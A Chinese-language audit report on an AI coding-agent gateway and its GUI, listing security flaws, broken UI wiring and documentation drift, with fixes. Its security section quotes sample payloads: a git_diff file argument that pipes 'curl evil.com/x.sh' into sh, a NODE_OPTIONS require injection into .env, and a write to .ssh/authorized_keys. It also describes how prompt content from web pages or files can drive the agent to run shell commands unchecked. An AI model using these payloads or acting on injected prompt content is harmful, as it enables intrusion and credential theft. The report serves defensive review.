# PulseFlow（岐黄诊断引擎）全面严格审查报告

> 审查日期：2026-10-02
> 审查范围：packages/agentai-gateway（13.4 万行 / 423 文件）、agentai-gui（5.2 万行 / 160 文件）、agentai-core、agentai-qqbot、agentai-vscode
> 审查方式：4 个独立维度并行静态审计 + 脚本实测 + git 实测 + 测试实跑（gateway vitest 全量 246.92s）
> 结论口径：**所有数字均为实测**，所有结论均标注 `文件:行号`。文档声明与实际代码冲突的，以实际代码为准。

## 总览

| 维度 | P0 | P1 | P2 | 小计 |
|---|---|---|---|---|
| 前端功能构造缺陷（GUI） | 10 | 23 | 14 | 47 |
| 后端运行时逻辑 | 6 | 12 | 7 | 25 |
| 前后端契约一致性 | 4 | 31 | 3 | 38 |
| 工程卫生与文档失真 | 3 | 9 | 12 | 24 |
| **合计** | **23** | **75** | **36** | **134** |

### 三条致命攻击链（可利用，非理论风险）

**链 1：未授权 RCE**
```
鉴权默认关闭 (middleware/auth.ts:3)  ×  无全局限流 (app.ts:85-99)
    ×  run_shell_command 零审批 (tools.ts:6749 + agentai-loop.ts 审批只覆盖 write/multi_edit/delete)
    ×  git_* 命令注入 (tools.ts:5176 反引号/$() 未转义，声明为 low/high 风险不触发审批门)
    ×  .env 任意变量注入 (routes/settings.ts:147，provider 字段无字符集校验)
```
→ 任何能影响 prompt 的输入（用户消息、网页内容、被读入的文件）都能触发任意命令执行。这条链**不需要任何 prompt 注入技巧**，模型正常调用工具即会命中。

**链 2：跨用户工作区串扰（数据错乱）**
```
routes/chat.ts:247 wm.setProjectDir(req.body.projectDir)  ← 模块级全局单例
    × tools.ts 44 处 wm().projectDir 作为路径基准（工具执行时才读，存在 TOCTOU 窗口）
    × git_* handler 签名 (args) 不接收 ctx，完全无法按请求隔离
    × setProjectDir 还 _saveWorkspaceConfig() 持久化到磁盘
```
→ 用户 A 的请求会把全局工作区改成 A 的目录；B 的请求（不传 workspace）随即在 A 的项目上执行读写与 git 操作，且**永久写入全局配置**。

**链 3：服务不可用 + 静默数据丢失**
```
SSE 路径 limiter.release() 永不调用 (routes/chat.ts:1290 提前 return vs :1563 唯一释放点)
    + maxConcurrency=2 + userId 默认 'default'
→ 第 3 个并发流式请求后，所有匿名用户永久 429（直到进程重启）

throttledStorage 2s 纯延迟写入无 beforeunload flush (store/chatStore.ts:16)
    + ChatView 会话隔离读错结构 (SessionMessage 无 id 字段)
→ F5 丢最后 2 秒消息；流式中切换会话，AI 回复永久消失
```

---

# 一、P0 问题清单（23 条，必须立即处理）

## A. 安全与权限

### P0-1 `run_shell_command` / `run_command` / `run_background` 零审批门
`tools.ts:6749`
```ts
run_shell_command: async (args: any) => {
  const { execSync } = await import('child_process');
  const timeout = (args.timeout || 30) * 1000;   // 无上限
  const result = execSync(args.command, { cwd, timeout, ... });
```
`args.command` 原样进 shell，无转义/无白名单/无 `sandboxGuard`。`agentai-loop.ts` 的 `dispatchToolCalls` 审批只覆盖 `['multi_edit','write_file','delete_file']`，其余走 `else { approvedCalls.push(tc.id) }`。`tool-groups.ts:212` 的 `needsApproval()` 是无调用方的死函数。`tool-registry.ts:366` 的 critical 风险门只判 `critical`，而 shell 工具声明为 `high`（不触发）。

**表现**：模型被诱导即任意 RCE。
**修复**：shell 类工具改 `execFileSync` 参数数组形式；声明为 `critical`；接入审批门。

### P0-2 `git_*` 工具命令注入
`tools.ts:5191`
```ts
const msg = (args.message || 'update').replace(/"/g, '\\"');
const out = execSync(`git commit -m "${msg}" 2>&1`);
```
只转义双引号。`git_diff`/`git_log` 的 `args.file` **零转义**拼进命令串（`tools.ts:5155,5167`）。同样模式在 `git push/pull/checkout/add` 重复出现。
**表现**：`git_diff({file:"a.ts; curl evil.com/x.sh | sh"})` → 直接 RCE。

### P0-3 `POST /v1/settings/keys` 可向 .env 注入任意环境变量
`routes/settings.ts:147`
```ts
const { provider, apiKey } = req.body || {};
const envVar = ENV_KEY_MAP[provider] || `${provider.toUpperCase()}_API_KEY`;
writeEnvKey(envVar, apiKey);
process.env[envVar] = apiKey;
```
`provider` 无字符集校验，`apiKey` 未转义（可换行注入第二个键值对）。
**表现**：`{"provider":"NODE_OPTIONS","apiKey":"--require /tmp/evil.js"}` → 写进 .env → 进程重启即 RCE。`DELETE` 同理可删任意 env（`{"provider":"PATH"}`）。

### P0-4 `.env` 真实 API Key 曾提交进 git 历史
`git log --all -- .env` → 2 个提交（`d103a62` 引入 +39 行、`e7a9a62` 删除）。历史中含 `AGENTAI_API_KEY=sk-SsG…`、`AGNES_API_KEY=sk-SsG…`、`DEEPSEEK_API_KEY=sk-8bf…`、`OPENAI_API_KEY=…`（已掩码）。
当前工作树已 ignore，**但历史 blob 可通过 `git show d103a62:.env` 完整恢复**。
**动作**：先轮换 4 个 Key，再 `git filter-repo --path .env --invert-paths`。若已 push，视为已泄露。
（正面：当前 1956 个跟踪文件 grep `sk-`/`ghp_`/`AKID`/`AKIA`/`xoxb-` → 0 命中）

### P0-5 鉴权默认关闭 + 无全局限流 + body 解析在鉴权之前
`middleware/auth.ts:3`
```ts
if (process.env.AGENTAI_AUTH_ENABLED !== 'true') return next();
```
`app.ts:85-99` 中间件链只有 cors → `express.json({limit:'50mb'})` → auth。**无任何 rate-limit 挂载**（`rate-limit.ts` 只在 chat.ts 单点实例化）。
**表现**：默认配置下 50MB 请求体先完整读入内存再决定是否 401 → 内存耗尽向量。CORS 对任意 `localhost:任意端口` 放行且 `credentials:true`。

### P0-6 `read_file` 完全绕过沙箱，可读 .env / AWS 凭证 / 任意凭据
`tools.ts:1819`
```ts
read_file: async (args, ctx) => {
  const { file_path: fp, offset, limit } = args;
  const resolved = resolvePath(fp, ctx?.workspace);
  // ← 无 sandboxGuard（全文件仅 7 处调用，read_file 不在其中）
```
`resolvePath`(`tools.ts:434`) 只拦 7 个系统目录字面量。`sandbox/rules.ts:119` 把 `.ssh/**`/`.aws`/`.gnupg` 列为 deny、`.env*`/`*.pem` 列为 prompt —— 这套规则对 read_file 完全不生效。且 `sandboxGuard` 的 prompt 分支 `return null`（`tools.ts:466`）等于完全放行，警告信息根本没返回。
**表现**：`.aws/credentials`、`.npmrc`、`.docker/config.json`、`%APPDATA%` 下任何凭据全文回传给模型并写入日志。

### P0-7 `.env` 中 125MB 日志已 `git add`，仓库体积 613MB
`git status` → `A packages/agentai-gateway/gateway-restart.log.old`（125,087,169 字节）。`git count-objects -vH` → size-pack **612.95 MiB**，而全部 1956 个跟踪文件工作区总和仅 157.4 MB —— 单文件占 ~80%。
成因：`.gitignore` 有 `*.log` 但无 `*.log.*`。

### P0-8 `undo_edit` 写目标无沙箱检查
`tools.ts:2015`
```ts
undo_edit: async (args, ctx) => {
  const ws = wm().projectDir;              // ← 全局单例，可能不是本请求的 workspace
  const backupDir = path.join(ws, '.agentai', 'backups');
  const latestBak = path.join(backupDir, backups[0]);
  const resolved = resolvePath(args.file_path, ctx?.workspace);
  fs.writeFileSync(resolved, content, 'utf-8');   // ← 无 sandboxGuard
```
对比同文件 write_file/delete_file/copy_file/move_file 都有。
**表现**：`undo_edit({file_path:"../../.ssh/authorized_keys"})` 在有同名备份时直接写入工作区外。

### P0-9 `POST /v1/chat` 的全局工作区串扰（跨用户数据错乱）
见开头攻击链 2。`routes/chat.ts:247` + `tools.ts` 44 处 `wm().projectDir`。

### P0-10 用户中断不取消上游 LLM 请求
`agentai-loop.ts:349`（`abort()` 全文）
```ts
abort() {
  this._aborted = true;
  this._abortedGeneration = this._runGeneration;
  for (const [id, entry] of this.pendingApprovals) { ... }
  this.emit('aborted');
}   // ← 不触碰 AbortController
```
`routes/chat.ts` 中 `abortSignal` 出现 **0 次** → `agentai-loop.ts:484` 永远走 `?? new AbortController().signal`（永不 abort 的 signal）。
**表现**：中断后 `router.chat()` 的 fetch 继续跑完整轮（长任务数分钟），`res.write()` 全部落进已销毁 socket（`chat.ts:448` 静默吞掉），token 照常计费，`activeLoops` 条目泄漏。

### P0-11 `/v1/chat/completions` 端点不存在
`services/api.ts:369` 调 `/v1/chat/completions`，后端只有 `routes/chat.ts:206` 的 `POST /v1/chat`。且 `api.ts` 有 `|| ''` 兜底 → **恒 404 但静默失败无提示**。
（已实测坐实）

### P0-12 Git 鉴权面板整体是死代码
`routes/git-auth.ts` 是纯服务模块（只有导出函数、无 Router），全库 **grep git-auth 的 import → 0 命中**。GitAuthPanel 的 7 个 `/v1/git/auth/*` 端点全部不存在，整个面板不可用。
（已实测坐实）

### P0-13 8 个 stats 端点因双重前缀永久 404
`routes/stats.ts:10` 用绝对路径 `statsRouter.get('/v1/metrics/models')`，而 `app.ts:135` 以 `app.use('/v1', statsRouter)` 挂载 → 实际路径 `/v1/v1/metrics/models`。
（已实测坐实；且 `app.ts:497` 注释自认："旧 inline 版本无 /stats /pause /resume，前端调用会 404"）

### P0-14 前端从不发送 `x-agentai-token`
一旦开启 `AGENTAI_AUTH_ENABLED=true`，除 3 个白名单外全部 401，**GUI 整体不可用**。而错误文案指引用户调用的 `/v1/auth/init` 端点本身不存在。

## B. 前端功能构造缺陷

### P0-15 会话隔离读错 store 结构 → 流式回复永久丢失
`components/ChatView.tsx:870`
```ts
const sessionStore = useSessionStore.getState();
const session = sessionStore.sessions.find(s => s.id === sendSessionId);
if (session) {
  const msgIdx = (session.messages as any[]).findIndex(m => m.id === id);  // ← SessionMessage 无 id 字段
  if (msgIdx >= 0) { ... }
  return;   // 不更新当前显示
}
```
`store/sessionStore.ts:4` 的 `SessionMessage` = `{ role, content, ts }`，**没有 id**。`findIndex` 恒 -1 → 恒走 `return` 丢弃更新。
**表现**：发送后立刻切会话 → AI 回复、工具结果、token 全部蒸发，切回来也找不到。**token 照烧，结果无处可见。**

### P0-16 8 个连接器开关虚假启用（UI 与后端永久不同步）
`components/Composer.tsx:1149`
```ts
const response = await fetch(conn.toggleApi, { method: 'POST' });  // ← 无 body
if (response.ok) setConnectors(prev => prev.map(c => ({ ...c, enabled: !c.enabled })));
```
后端 `routes/connectors.ts:176`：`const enabled = !!req.body.enabled` → 空 body 恒 false → **后端把连接器禁用**，前端拿到 ok 后本地翻转成"已开"。
**表现**：Android 手机/浏览器控制/QQ Bot/公众号运营/SketchUp/语音唤醒/音乐播放/Git 版本控制 8 个开关虚假可用，刷新回退。

### P0-17 编辑器搜索框完全不过滤
`components/Editor.tsx:140` 声明 `searchQ`，`:605` 渲染 Input（placeholder「搜文件名...」）。全文件 `searchQ` **只有 2 处命中（声明+使用）**，没有任何 `.filter()` 消费。

### P0-18 `webSearch` 开关是纯装饰
`components/Composer.tsx:82` 声明，`:730` 翻转状态，UI 完整显示"已开启/关闭联网搜索"。`handleSend` 的请求体字段（ChatView.tsx:1364）**无 webSearch 或任何联网字段**。
**表现**：按钮变绿，AI 依然完全不能上网。给模型的错误预期比没有开关更糟。

### P0-19 `fileTreeVisible` 是死状态，整条"文件树→上下文"链路死亡
`App.tsx:436` 声明、`:1077` 切换、`:1081-1082` 改颜色。全项目 **4 次命中全在这个按钮上**，无任何组件消费它。连带 ChatView 里等待 `agentai:add-file-context` 事件的 20 行逻辑（`ChatView.tsx:1639-1661`）**永远不会被触发**。

### P0-20 收藏功能提示与实际相反
`components/MsgActions.tsx:110`
```ts
onBookmark?.();
antdMsg.success('⭐ 已收藏');   // ← 无论新增还是取消
```
ChatView 的 `bookmarkMessage`(:1508) 实现的是 toggle。按钮无任何视觉状态反馈 → 用户无法知道当前收藏状态，且 localStorage 实际状态与用户认知相反。

### P0-21 反馈点赞/点踩双重写入且语义相反
`MsgActions.tsx:77` 先写 localStorage 再 `onFeedback(kind)`；`ChatView.tsx:1482` 收到后**读到相同值就删除**。
**表现**：点赞 → 按钮高亮但刷新丢失；"撤销"文案实际每次都发 `thumbs_up` → 后端反馈数据统计口径错误，撤销被记成点赞。

### P0-22 `onWidgetShow` 无 handler，widget 渲染链路永远无法触发
`services/api.ts:287` 分发 `widget_show`，全项目**无任何组件提供该 handler**。而 chatStore 有 widget segment 类型、Thread.tsx 有 `WidgetCard` 渲染器（:1396）—— 整条链路不可达。

### P0-23 上下文 rollover 2 秒延迟后无条件清空，且摘要从未进入 prompt
`ChatView.tsx:1252`
```ts
setTimeout(() => {
  const id = createSession("续: " + firstText.slice(0, 30));
  setActive(id);
  clearMessages();     // ← 2秒内用户输入的消息一起抹掉
}, 2000);
```
异常被空 catch 完全吞掉。且 `summary` 算出来后**只写进 MemoryEngine，从未展示也从未发给 AI** → "上下文压缩"功能实际不生效。

---

# 二、跨维度共性问题（按根因归并）

## 根因 A：只做了 UI 没做接线 —— 8 处

| 位置 | 症状 |
|---|---|
| `Composer.tsx:82` | webSearch 开关不发给后端 |
| `App.tsx:436` | fileTreeVisible 无消费者 |
| `Editor.tsx:140` | searchQ 无消费者 |
| `ChatView.tsx` onWidgetShow | SSE 事件无 handler |
| `Composer.tsx:191` | composingRef 只写不读 → 中文 IME 选词 Enter 直接发送 |
| `ChatView.tsx:1252` | 摘要只写记忆库不进 prompt |
| `EditorChatPanel` / `SchedulePanel` | 组件存在但无入口（SchedulePanel 仅 App.tsx:44 注释"已合并"） |
| `MessageActions` | 收藏/反馈 双写冲突 |

**建议**：立规矩 —— 新增任何 UI 交互，必须同时提交 (a) 状态来源 (b) 请求/事件接线 (c) 后端契约。CI 加一条 ESLint 自定义规则：检测"声明后仅出现在 JSX 渲染分支、无 effect/handler 消费"的 useState。

## 根因 B：全局可变单例 + 无请求级隔离

| 单例 | 位置 | 后果 |
|---|---|---|
| `WorkspaceManager` | `workspace-manager.ts` | 跨用户工作区串扰（P0-9） |
| limiter `concurrencyBuckets` | `rate-limit.ts` | SSE 路径不释放 → 永久 429（P1-5） |
| provider `failureCount` / `_consecutiveFailures` | `llm-router.ts` | 熔断永久锁死（P1-2/P1-3） |
| module-level `_chatAvatarSize` | `Thread.tsx:141` | 主题/字号切换后需刷新才恢复 |

## 根因 C：计数器只写不读 / 定时器只声明不启动

| 位置 | 常量 | 状态 |
|---|---|---|
| `agentai-loop.ts:2357` | `MAX_AUTO_RESUME = 10` | 声明后全文 0 引用 → `finish_reason='length'` 可无限自旋，单请求可达 **90 次付费 LLM 调用** |
| `agentai-loop.ts:1722` | `lastToolActivityAt` | 仅在 `dispatchToolCalls` 后更新 → 纯文本对话时 idle 超时永不触发 |
| `llm-router.ts:232` | `_healthCheckTimer` | 声明 + clearInterval 存在，**无 setInterval** → 无流量时熔断状态永久悬挂 |
| `llm-router.ts:207` | `REQUEST_PACING_MS = 3000` | 全文 0 引用，`lastCallAt` 只写不读 → 主动调速机制不存在 |
| `sandbox/rules.ts` prompt 裁决 | — | `return null` 等于完全放行，警告信息未返回 |

## 根因 D：文档声明与实现严重失真（直接误导 AI 助手）

| AGENTS.md 声明 | 实测 | 差异 |
|---|---|---|
| 141 个工具 | `tools.ts:497` EXTRA_TOOLS = **198** | +40.4% |
| system-prompt.ts ~250 行 | **642 行** | +157% |
| 8 个 Provider | `llm-router.ts:1370` PROVIDER_DEFAULTS = **17 个** | 文档 8 个全在，但代码多出 agnes/alrc/factory/qwen/moonshot/anthropic/minimax/doubao |
| 上下文注入 ~8 层 | `agentai-loop.ts:559` 内 **34 处 `systemMsgs.push`** | "19 层→8 层精简"未生效 |
| 已删除 5 个死代码文件 | `self-verifier.ts`(99行) / `trust-ladder.ts`(394行) **仍存在** | 后者还是无 importer 的孤儿 |
| README `pnpm dev:qqbot` | 根 package.json **无此 script** | — |

**Provider 三表不同步（隐性 P1）**：
- `llm-router.ts:1370` PROVIDER_DEFAULTS = 17 项（唯一活的）
- `provider-config.ts:36` PROVIDER_CONFIGS = 11 项 —— **全库 0 引用，纯孤儿文件**
- `model-selector.ts:20` BUILTIN_MODELS = 46 项；前端 `store/modelStore.ts:82` = **68 个 ModelConfig**
- `agnes-2.5-flash` 一个模型名硬编码在 **11 个文件**中
- 后果：`filterRequestFields()` 对未配置 provider 走 `return body` **完全不过滤字段** → thinking 扩展字段直接发给不支持的 provider

## 根因 E：死代码规模

- **77 个孤儿文件 / 18,157 行**（import 图实测，解析 1337 条边，覆盖 gateway 415 + gui 155 文件）。最大的：`self-diagnosis.ts`(648)、`event-to-memory.ts`(636)、`ab-testing.ts`(596)、`predictive-maintenance.ts`(581)、`distillation-on-demand.ts`(570)、`enhanced-image-tools.ts`(496)
- **5 个死工具数组**：`system-prompt-core.ts:44`(29 工具)、`builtin-tools-manager.ts:44`(10)、`mcp-skill-market-server.ts:37`(5)、`media-generation-tools.ts:333`(6)、`ai-marketing-tools.ts:467`(10)、`enhanced-image-tools.ts:416`(4)、`multi-platform-publish.ts:406`(5)、`skill-market-tools.ts:363`(7)
- **16 个测试/演示脚本混在 src/**（`test-skill-market-*.ts` 6 个、`*-demo.ts` 3 个、`*-example.ts` 3 个），全部孤儿但会被 `tsc --noEmit` 编译
- **122 个备份/临时文件 / 120.52 MB**。最危险：`packages/agentai-gui/src/components/ChatView.tsx.bak`（113KB）**紧邻源码**，AI 编辑 ChatView 时可能误读
- **46 个客户报价 xlsx 已进版本库**（325KB）。`.gitignore` 规则是 `**/报价*.xlsx`（中文名），实际文件名是 `quotation_*.xlsx` → **规则完全没生效**。这是客户业务数据
- **6 个 .gitignore 覆盖缺口**（已提交文件永不会被忽略）：`bash.exe.stackdump`×2、`gateway-restart.log.old`(125MB)、`references/cursor-mcp/dist/main.js`(2.67MB，`dist/` 未加 `/` 前缀不匹配嵌套路径)、`tsconfig.tsbuildinfo`(594KB)、`data/model-metrics.db`(311KB)

## 根因 F：重复实现

| 类别 | 数量 | 最严重的一处 |
|---|---|---|
| Token 估算 | 4 套并行 | 后端 `token-utils.ts` 用 tiktoken，前端 `tokenCounter.ts` 用 `len/4` → **前后端计数必然不一致**；`token-estimate.ts`(34行) 仅被自己的测试引用 |
| SSE 解析 | 10 处 | `llm-router.ts:1880`、`routes/chat.ts:450`、`routes/goal.ts:83`、`routes/suggestions.ts:329`、`skills/watcher.ts:169`、前端 5 处 |
| 时间格式化 | 46+ 处 | GUI 无任何共享 date utils，每个面板各写一套 |
| Provider 配置 | 4 处 | 见根因 D |

## 根因 G：React 正确性违反

| 位置 | 问题 |
|---|---|
| `Thread.tsx:168` | **`AssistantText` 在 render 期间调 `setDisplay`** —— 违反 React 规则，并发模式下行为不确定，文本可能卡住或倒退 |
| `useSessionAutoSave.ts:30` | 去重 key 含全文文本 → 流式期间每帧 `addMessage` → 新数组 → persist 序列化整个 store，**注释声称的"30 秒节流"完全无效** |
| `useSessionAutoSave.ts:66` | 定时器 effect 依赖 `messages` → 每帧 clearInterval+setInterval → 30 秒计时器**永远归零**；且 `persistMessage` 只调本地 `addMessage`，**无任何 `/api/sessions` 调用**，注释承诺的 Gateway 备份链路不存在 |
| `ChatView.tsx:1393` | `handleSend` 依赖数组缺 `sessions` 等十余项 + 显式 `// eslint-disable-line` 绕过 → 自动标题读陈旧数据，新建对话第一条消息标题不更新 |
| `ChatView.tsx:1736` + `:1728` | **两个 effect 都监听 `loading` 且都调 `handleSend`** → 排队消息可能重复发送 |
| `sessionStore.ts:66` | 同 workspace 只保留最新 session，旧的**静默删除**，且 persist 会把删除写回 localStorage → **用户历史对话不可恢复**（代码注释称这是"修复"） |
| `ChatView.tsx:275` | `<img src={img.file_path}>` —— 应为 `path`。已修 skill 记录的同类问题 |
| `Composer.tsx:416` | 语音识别用闭包旧 `draft` → `continuous:true` 分多次回调，只有最后一段进输入框 |
| `Composer.tsx:191` | `composingRef` 只写不读 → **中文输入法选词 Enter 直接发送消息**（100% 影响中文用户） |

## 根因 H：无障碍与亮色主题

- **硬编码颜色 713 处**违反 AGENTS.md:62-69 明文规范。高频：`#52c41a`(44)、`#ef4444`(32)、`#CD7A3A`(29)。典型：`App.tsx:893` `accentColor = themeStyle==='midnight' ? '#8b6bff' : ...` 与 CSS 变量 `--accent` **不同步** → 切主题时 antd colorPrimary 与 CSS 变量不一致
- **键盘完全不可达**：`App.tsx` 8 个导航项 + 主题按钮 + 面板开关 + `Composer.tsx:601` 附件删除 × 全是 `<span onClick>` 无 `tabIndex`/`role`/`onKeyDown`。讽刺的是 `NavGroupDropdown`(:326-367) 正确实现了 role="menu"/Escape —— 说明作者知道，但只做了一处
- **模态框无滚动锁/无 focus trap/无 Escape**：舌诊弹窗（`Composer.tsx:668`）是手写 fixed 遮罩，打开后滚轮会滚动背景
- **零虚拟化**：`ChatView.tsx:1957` `messages.map` 全量渲染，`react-window|zustand-virtual|virtuoso` 全库 0 命中。1000+ 消息时滚动掉帧
- **`CTX_MAX = 1_000_000`**（`ChatView.tsx:669`）导致上下文监控条形如虚设，`FOLD_THRESHOLD=0.70` 几乎永不触发
- `AutoHideTaskBar`（`ChatView.tsx:13`）8 秒自动隐藏后**无法恢复**（`visible={true}` 恒定 + `onHidden` 空函数）→ 长任务恢复入口永久消失
- `ErrorBoundary` 位置错误（`App.tsx:1246`）：只包 center 区，RightPanel/StatusBar/Splash 全在边界外；且 `onRetry={() => setPage(page)}` 设成同值 → React bailout → **重试按钮无效**
- `Splash` 每次启动强制 3600ms 阻塞且 sessionStorage 未去重（对比 Onboarding :732 有正确去重）

---

# 三、测试与验证现状

```
packages/agentai-gateway: npx vitest run  (246.92s)
Test Files  1 failed | 47 passed (48)
Tests       3 failed | 488 passed | 1 skipped (492)
```
失败全部在 `src/self-memory-updater.test.ts:95/111/147`，均为 `Test timed out in 10000ms`。
**CI 若跑 test 会红。** 无 `.only`/`xit`/`xdescribe`（仅 1 处 `it.skip`，属预期跳过）。
正面：AGENTS.md:259 自评"缺少端到端测试"已过时，当前有 492 个用例。

---

# 四、契约全量数据

| 指标 | 数值 |
|---|---|
| 后端端点（还原完整路径） | **421**（59 个挂载点） |
| 后端 socket 事件 / SSE 端点 | 271 / 5 |
| 前端调用点 | 235（218 处 fetch 中 13 处动态变量无法静态解析） |
| **契约匹配成功** | **197（84%）** |
| **不匹配** | **38** |

- **孤儿 API 255 个**：`/v1/auth/*`(4)、`/v1/subscription/*`(4)、`/v1/customers/*`(10)、`/v1/materials/*`(7) 等整模块前端零入口
- **git-simple.ts 只有 4 个端点**，而 `gitService.ts` 调用 8 个 → `diff`/`log`/`branches`/`pull`/`checkout`/`stash`/`reset` 全部不存在。但因 `add`/`commit`/`push` 可用，**Git 面板看起来正常而多数按钮无效** —— 这类"部分可用"最隐蔽
- **C 类（method 不一致）实为 0 条**：脚本初报 13 条，逐条读码确认全是提取器误报（method 跨行读取）。`/v1/3d-generate/:taskId`、`PATCH /v1/mcp/config/:name` 等后端均确实存在
- **通过项**：`/v1/chat` 请求体 16 个字段逐一匹配无一对不上；`/v1/settings/keys` 全链路干净；响应结构无 `undefined` 读取；SSE 事件名全部一致

---

# 五、一条元发现：自动化检查覆盖率本身不可信

`tools.ts:5253-5600` 约 350 行（`git_branch` 起所有 handler）**缩进脱离文件其余部分**（0 空格 vs 统一 2 空格）。

后果：本次审计中脚本化检查先后产生 **96 个和 7 个假阳性**"handler 缺失"报告，均源于该区间。人工逐点复核后实际为 `declared 198 / handlers 203 / MISSING(0)` —— 最初"7 个工具声明无实现"的结论**不成立**。

**这意味着**：
1. `git_*`、`*_remote`、`pascal_*` 这批 handler 事实上处于"半隐形"状态
2. 任何依赖文本模式的安全扫描、lint 规则、死代码检测在这段区间都会给出错误结论
3. 必须先修复缩进，自动化审计才有意义

---

# 六、建议执行顺序

**立即（安全止血）**
1. 轮换 4 个已泄露的 API Key（先轮换，再清历史）
2. `git rm --cached` 125MB 日志 + 46 个客户 xlsx + stackdump/vsix/tsbuildinfo/db；`.gitignore` 补 `*.log.*` `*.stackdump` `dist/**` `**/quotation_*.xlsx`
3. `run_shell_command` / `run_command` 改参数数组 + 声明 critical + 接审批门
4. `git_*` 全部命令改 `execFileSync` 参数数组
5. `routes/settings.ts` 的 `provider`/`apiKey` 加字符集校验
6. `read_file` 补 `sandboxGuard`；`undo_edit` 补 `sandboxGuard`
7. `POST /v1/chat` 把 `projectDir` 从全局单例改为请求级 ctx（同时解决 P0-9）
8. 中间件顺序改为 限流 → 鉴权 → body 解析；auth 默认改为 true

**本周（功能可用性）**
9. 修 `SessionMessage` 加 id（解决 P0-15 流式丢失）
10. `connectors` 切换带 body（解决 P0-16）
11. `read_file` 沙箱 + SSE `limiter.release()` 补全（解决永久 429）
12. `/v1/chat/completions` → `/v1/chat`；stats.ts 去双重前缀；git-auth 端点补齐或删除面板
13. 修 AGENTS.md 的 4 个数字（工具 198、system-prompt 642 行、provider 17、注入 34 层）

**本月（架构还债）**
14. 修 `tools.ts:5253` 缩进，恢复自动化审计可信度
15. `MAX_AUTO_RESUME` 补比较；`lastToolActivityAt` 改为由 delta 事件重置；启动 health check 定时器
16. 删 5 个死工具数组 + 16 个 src 内测试脚本 + 77 个孤儿文件（18,157 行）
17. provider 配置收单一来源；`provider-config.ts` 补齐或删除
18. token 估算前后端统一；抽共享 SSE 解析器与 date utils
19. 删 `ChatView.tsx.bak`（AI 误读风险）

**建立规矩（防止新增同类问题）**
20. **"声明可验证"**：文档里每个数字必须来自脚本，PR 时校验
21. ESLint 强制 `exhaustive-deps`，删除现有 4 处 `eslint-disable-line`
22. CI 加：孤儿文件检测、契约 diff（后端路由 vs 前端 fetch）、死工具数组检测
23. 新增 UI 交互必须同时提交 状态来源 + 接线 + 后端契约